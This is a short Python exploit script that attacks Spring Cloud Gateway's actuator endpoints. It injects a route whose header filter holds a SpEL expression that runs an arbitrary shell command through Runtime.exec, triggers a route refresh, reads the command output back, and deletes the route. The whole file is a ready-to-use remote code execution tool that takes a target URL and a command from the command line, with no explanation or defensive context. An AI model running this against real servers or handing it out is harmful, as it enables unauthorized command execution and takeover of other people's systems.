import requests
import json
import sys
requests.packages.urllib3.disable_warnings()


def exec(url, cmd):
    proxies = {
        'http': '127.0.0.1:8080',
        'https': '127.0.0.1:8080'
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36',
        'content-type': 'application/json',
    }
    payload = '''{
  "id": "test",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"%s\\\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}''' % (cmd)
    url2 = url + "/actuator/gateway/refresh"
    url1 = url + "/actuator/gateway/routes/test"
    requests.post(url=url1, data=payload, headers=headers, verify=False)
    requests.post(url=url2, headers=headers, verify=False)
    try:
        r = requests.get(url=url1, verify=False)
        data = json.loads(r.text)
        test = data['filters'][0].split("'")[1]
        print(test)
        requests.delete(url=url1, verify=False)
    except Exception as e:
        print(e)


if __name__ == "__main__":
    if len(sys.argv) == 3:
        url = sys.argv[1]
        cmd = sys.argv[2]
        exec(url, cmd)
    else:
        print('eg:python3 spring_rce.py url cmd')
